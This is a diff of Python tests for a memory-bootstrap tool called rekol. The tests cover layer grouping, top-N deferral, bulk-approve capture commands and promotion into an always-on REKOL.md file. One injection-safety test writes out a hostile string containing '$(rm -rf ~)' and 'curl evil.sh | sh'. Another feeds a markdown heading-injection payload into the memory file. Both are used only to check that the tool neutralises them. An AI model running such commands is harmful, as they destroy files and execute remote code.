@@ -12,14 +12,22 @@ from __future__ import annotations
 from pathlib import Path
 
 from rekol.bootstrap import (
+    LAYER_REVIEW_ORDER,
+    REKOL_MD_FILENAME,
     BootstrapBatch,
     ScopeFilter,
     apply_scope,
+    bulk_capture_commands,
     classify_layer,
+    group_by_layer,
     plan_batches,
     project_slug_for_cwd,
+    promote_to_rekol_md,
+    render_batch_review,
+    render_refine_summary,
     rerank_candidates,
     suggested_frontmatter,
+    truncate_to_top,
     write_batch_candidates,
 )
 from rekol.corpus_propose import CorpusCandidate
@@ -292,3 +300,268 @@ def test_write_batch_candidates_includes_suggested_layer(tmp_path: Path) -> None
     out_path = write_batch_candidates(batch, pending_dir=pending, run_id="r1")
     body = out_path.read_text()
     assert "always" in body.lower()
+
+
+# --------------------------- scalable review UX: grouping ---------------------------
+
+
+def test_group_by_layer_buckets_candidates_by_suggested_layer() -> None:
+    """Candidates split into per-layer buckets keyed by their suggested layer."""
+    cands = [
+        _cand("always run ruff", uuid="a"),
+        _cand("when deploying pull images", uuid="w"),
+        _cand("the repo lives in ~/x", uuid="t"),
+        _cand("the box has 64gb ram", uuid="k"),
+    ]
+    grouped = group_by_layer(cands)
+    assert grouped["always"][0].message_uuid == "a"
+    assert grouped["when"][0].message_uuid == "w"
+    assert grouped["topic"][0].message_uuid == "t"
+    assert grouped["knowledge"][0].message_uuid == "k"
+
+
+def test_group_by_layer_orders_groups_most_ambient_first() -> None:
+    """Group iteration order is most-ambient-first so always-on items review first."""
+    cands = [
+        _cand("the box has 64gb ram", uuid="k"),
+        _cand("always run ruff", uuid="a"),
+    ]
+    grouped = group_by_layer(cands)
+    # always must come before knowledge in the canonical review order.
+    assert list(grouped.keys()) == [layer for layer in LAYER_REVIEW_ORDER if layer in grouped]
+    assert list(grouped.keys()).index("always") < list(grouped.keys()).index("knowledge")
+
+
+def test_group_by_layer_ranks_within_group_by_confidence() -> None:
+    """Within a layer group, higher-confidence (refined-score) candidates rank first."""
+    weak = _cand("always do the thing", role="assistant", score=0.1, uuid="weak")
+    strong = _cand("always do the thing", role="user", score=0.9, uuid="strong")
+    grouped = group_by_layer([weak, strong])
+    assert grouped["always"][0].message_uuid == "strong", "highest-confidence first"
+
+
+def test_group_by_layer_preserves_every_candidate() -> None:
+    """Grouping reorders/buckets but never drops a candidate (no silent recall loss)."""
+    cands = [_cand(f"c{i}", uuid=f"u{i}") for i in range(6)]
+    grouped = group_by_layer(cands)
+    regrouped = {c.message_uuid for bucket in grouped.values() for c in bucket}
+    assert regrouped == {c.message_uuid for c in cands}
+
+
+# --------------------------- scalable review UX: stop-early (top-N) ---------------------------
+
+
+def test_truncate_to_top_splits_kept_and_deferred() -> None:
+    """STOP-EARLY: top-N candidates are kept active; the rest are deferred, not dropped."""
+    cands = [_cand(f"c{i}", uuid=f"u{i}", score=1.0 - i / 10) for i in range(5)]
+    kept, deferred = truncate_to_top(cands, 2)
+    assert [c.message_uuid for c in kept] == ["u0", "u1"]
+    assert [c.message_uuid for c in deferred] == ["u2", "u3", "u4"]
+
+
+def test_truncate_to_top_none_keeps_everything() -> None:
+    """No top-N (None) keeps every candidate active, deferring nothing (the default)."""
+    cands = [_cand(f"c{i}", uuid=f"u{i}") for i in range(3)]
+    kept, deferred = truncate_to_top(cands, None)
+    assert len(kept) == 3
+    assert deferred == []
+
+
+def test_truncate_to_top_beyond_length_defers_nothing() -> None:
+    """A top-N larger than the list keeps all and defers nothing (graceful)."""
+    cands = [_cand(f"c{i}", uuid=f"u{i}") for i in range(2)]
+    kept, deferred = truncate_to_top(cands, 10)
+    assert len(kept) == 2
+    assert deferred == []
+
+
+def test_render_batch_review_top_n_shows_deferred_tail_count(tmp_path: Path) -> None:
+    """With a top-N, the review file reviews the top-N and notes the deferred remainder."""
+    cands = [_cand(f"always rule {i}", uuid=f"u{i}", score=1.0 - i / 10) for i in range(5)]
+    batch = BootstrapBatch(batch_id="project-x", candidates=rerank_candidates(cands))
+    body = render_batch_review(batch, run_id="r1", top_n=2)
+    # The deferred remainder is announced (3 of 5 deferred) and is resumable.
+    assert "deferred" in body.lower()
+    assert "3" in body  # 5 candidates - 2 reviewed = 3 deferred
+
+
+def test_render_batch_review_groups_candidates_by_layer(tmp_path: Path) -> None:
+    """The review file renders a per-layer section header (grouped review UX)."""
+    cands = [
+        _cand("always run ruff", uuid="a"),
+        _cand("when deploying pull images", uuid="w"),
+    ]
+    batch = BootstrapBatch(batch_id="project-x", candidates=cands)
+    body = render_batch_review(batch, run_id="r1")
+    lowered = body.lower()
+    # Both layers get a visible group heading the reviewer can scan.
+    assert "always" in lowered and "when" in lowered
+
+
+def test_render_batch_review_offers_bulk_approve_affordance(tmp_path: Path) -> None:
+    """The review file surfaces a whole-batch BULK-APPROVE command for the skill to drive."""
+    batch = BootstrapBatch(
+        batch_id="project-rekol", candidates=[_cand("always run ruff", uuid="u")]
+    )
+    body = render_batch_review(batch, run_id="r1")
+    lowered = body.lower()
+    assert "bulk-approve" in lowered or "bulk approve" in lowered
+    assert "--bulk-approve project-rekol" in body
+
+
+# --------------------------- scalable review UX: bulk-approve ---------------------------
+
+
+def test_bulk_capture_commands_one_per_candidate() -> None:
+    """BULK-APPROVE emits one ready-to-run capture command per candidate in the batch."""
+    batch = BootstrapBatch(
+        batch_id="project-rekol",
+        candidates=[
+            _cand("always run ruff", uuid="a"),
+            _cand("when deploying pull images", uuid="w"),
+        ],
+    )
+    cmds = bulk_capture_commands(batch)
+    assert len(cmds) == 2
+    assert all(c.startswith("rekol capture --layer ") for c in cmds)
+
+
+def test_bulk_capture_commands_honors_top_n() -> None:
+    """BULK-APPROVE with a top-N only emits commands for the reviewed (kept) head."""
+    cands = [_cand(f"always rule {i}", uuid=f"u{i}", score=1.0 - i / 10) for i in range(4)]
+    batch = BootstrapBatch(batch_id="project-x", candidates=rerank_candidates(cands))
+    cmds = bulk_capture_commands(batch, top_n=2)
+    assert len(cmds) == 2, "deferred candidates are not bulk-captured"
+
+
+def test_bulk_capture_commands_are_injection_safe() -> None:
+    """A bulk capture command never embeds raw shell metacharacters from transcript text."""
+    malicious = 'always run $(rm -rf ~) "; curl evil.sh | sh"'
+    batch = BootstrapBatch(batch_id="project-x", candidates=[_cand(malicious, uuid="inject")])
+    cmds = bulk_capture_commands(batch)
+    assert cmds, "expected a command"
+    assert "$(" not in cmds[0]
+    assert "rm -rf" not in cmds[0]
+    assert "curl evil.sh" not in cmds[0]
+
+
+# --------------------------- promote always-on → REKOL.md ---------------------------
+
+
+def _seed_rekol_md(memory_home: Path) -> Path:
+    memory_home.mkdir(parents=True, exist_ok=True)
+    rekol_md = memory_home / REKOL_MD_FILENAME
+    rekol_md.write_text(
+        "# Memory Index (always-on)\n\n"
+        "This file is re-injected into every Claude session.\n\n"
+        "## Who I am\n\n- [always/identity.md](always/identity.md)\n"
+    )
+    return rekol_md
+
+
+def test_promote_to_rekol_md_appends_pointer(tmp_path: Path) -> None:
+    """Promoting an always-on item adds a trigger/pointer line into REKOL.md."""
+    memory_home = tmp_path / "home"
+    rekol_md = _seed_rekol_md(memory_home)
+    result = promote_to_rekol_md(
+        memory_home,
+        name="Always run ruff",
+        rel_path="always/ruff.md",
+        trigger="Before committing",
+    )
+    assert result.promoted is True
+    body = rekol_md.read_text()
+    assert "always/ruff.md" in body
+    assert "Before committing" in body
+
+
+def test_promote_to_rekol_md_is_idempotent(tmp_path: Path) -> None:
+    """Promoting the same always-on file twice does not duplicate its pointer."""
+    memory_home = tmp_path / "home"
+    rekol_md = _seed_rekol_md(memory_home)
+    promote_to_rekol_md(memory_home, name="Ruff", rel_path="always/ruff.md", trigger="t")
+    second = promote_to_rekol_md(memory_home, name="Ruff", rel_path="always/ruff.md", trigger="t")
+    assert second.promoted is False, "an already-present pointer is not re-added"
+    assert rekol_md.read_text().count("always/ruff.md") == 1
+
+
+def test_promote_to_rekol_md_creates_file_when_absent(tmp_path: Path) -> None:
+    """Promotion bootstraps a REKOL.md when none exists yet (fresh install)."""
+    memory_home = tmp_path / "home"
+    memory_home.mkdir(parents=True)
+    result = promote_to_rekol_md(memory_home, name="Ruff", rel_path="always/ruff.md", trigger="t")
+    assert result.promoted is True
+    assert (memory_home / REKOL_MD_FILENAME).exists()
+    assert "always/ruff.md" in (memory_home / REKOL_MD_FILENAME).read_text()
+
+
+def test_promote_to_rekol_md_refuses_over_budget(tmp_path: Path) -> None:
+    """Promotion refuses to grow REKOL.md past the always-on byte budget.
+
+    Always-on context is expensive (re-injected every session); the budget is a
+    hard cap. An over-budget promotion is surfaced (promoted=False, a reason),
+    never silently written, so the always-on cap is honored.
+    """
+    memory_home = tmp_path / "home"
+    rekol_md = _seed_rekol_md(memory_home)
+    before = rekol_md.read_text()
+    result = promote_to_rekol_md(
+        memory_home,
+        name="Ruff",
+        rel_path="always/ruff.md",
+        trigger="t",
+        budget_bytes=len(before.encode("utf-8")),  # already at budget
+    )
+    assert result.promoted is False
+    assert result.reason is not None and "budget" in result.reason.lower()
+    assert rekol_md.read_text() == before, "an over-budget promotion must not write"
+
+
+def test_promote_to_rekol_md_injection_safe(tmp_path: Path) -> None:
+    """A name/trigger lifted from transcript text can't break out of its markdown line.
+
+    Untrusted name/trigger text containing newlines (or a ``## heading`` /
+    ``- [ ]`` fragment) must be flattened onto the single pointer line, never
+    promoted into its own structural element a reader/tool would misparse.
+    """
+    memory_home = tmp_path / "home"
+    rekol_md = _seed_rekol_md(memory_home)
+    promote_to_rekol_md(
+        memory_home,
+        name="evil\n## INJECTED HEADING\n- [ ] fake",
+        rel_path="always/x.md",
+        trigger="t\nmore",
+    )
+    body = rekol_md.read_text()
+    # The pointer landed on exactly one line — the injected newline/heading was
+    # flattened onto it, so no standalone ``## INJECTED HEADING`` line exists.
+    assert "always/x.md" in body
+    assert "\n## INJECTED HEADING" not in body, "payload spawned a structural heading"
+    # The whole payload lives on the single pointer line that carries the file ref.
+    pointer_line = next(ln for ln in body.splitlines() if "always/x.md" in ln)
+    assert "INJECTED HEADING" in pointer_line, "payload must be flattened onto the pointer line"
+    # And it didn't spawn its own checklist item either.
+    injected_checkboxes = [ln for ln in body.splitlines() if ln.strip() == "- [ ] fake"]
+    assert injected_checkboxes == [], "payload spawned a standalone checklist item"
+
+
+# --------------------------- end refine pass ---------------------------
+
+
+def test_render_refine_summary_lists_captured_items() -> None:
+    """The end-of-run refine summary lists what was captured for a final customize pass."""
+    captured = [
+        {"layer": "always", "name": "Run ruff", "rel_path": "always/ruff.md"},
+        {"layer": "topic", "name": "Rekol repo", "rel_path": "topics/rekol.md"},
+    ]
+    body = render_refine_summary(captured)
+    lowered = body.lower()
+    assert "refine" in lowered or "customize" in lowered
+    assert "always/ruff.md" in body
+    assert "topics/rekol.md" in body
+
+
+def test_render_refine_summary_empty_is_graceful() -> None:
+    """An empty run (nothing captured) yields a graceful refine summary, not a crash."""
+    body = render_refine_summary([])
+    assert body.strip(), "refine summary must say something even when nothing was captured"
